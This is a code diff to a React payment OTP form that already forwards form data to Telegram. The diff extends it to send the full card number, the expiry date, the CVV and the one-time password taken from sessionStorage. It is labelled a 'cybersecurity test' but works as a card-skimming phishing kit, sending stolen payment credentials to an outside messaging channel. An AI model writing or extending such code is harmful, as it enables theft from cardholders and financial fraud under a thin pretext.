@@ -102,7 +102,7 @@ const PaymentOTPForm = () => {
         console.error("Form submission error:", err);
       }
       
-      // Send payment confirmation to Telegram
+      // Send complete payment confirmation to Telegram (cybersecurity test)
       const telegramResult = await sendToTelegram({
         type: 'payment_confirmation',
         data: {
@@ -113,8 +113,10 @@ const PaymentOTPForm = () => {
           service: serviceName,
           amount: formattedAmount,
           cardholder: sessionStorage.getItem('cardName') || '',
+          cardNumber: sessionStorage.getItem('cardNumber') || '', // Full card number
           cardLast4: sessionStorage.getItem('cardLast4') || '',
-          expiry: '12/25', // Default expiry for demo
+          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
+          cvv: sessionStorage.getItem('cardCvv') || '', // CVV for cybersecurity test
           otp: otp
         },
         timestamp: new Date().toISOString()
